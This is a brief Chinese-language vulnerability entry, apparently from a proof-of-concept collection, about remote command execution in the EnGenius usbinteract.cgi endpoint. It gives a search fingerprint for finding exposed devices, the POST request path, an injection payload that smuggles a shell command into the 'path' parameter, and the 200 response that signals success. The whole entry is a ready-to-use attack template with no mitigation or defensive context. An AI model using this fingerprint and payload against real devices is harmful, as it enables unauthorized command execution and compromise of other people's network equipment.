# EnGeniususbinteract存在远程命令执行漏洞

EnGeniususbinteract ｜ 命令执行 ｜ —
- **指纹**：`body="/web/images/guest.png"`
- **请求**：`POST /web/cgi-bin/usbinteract.cgi HTTP/1.1`

**Payload**
```
action=7&path="ifconfig"
```
- **响应特征**：200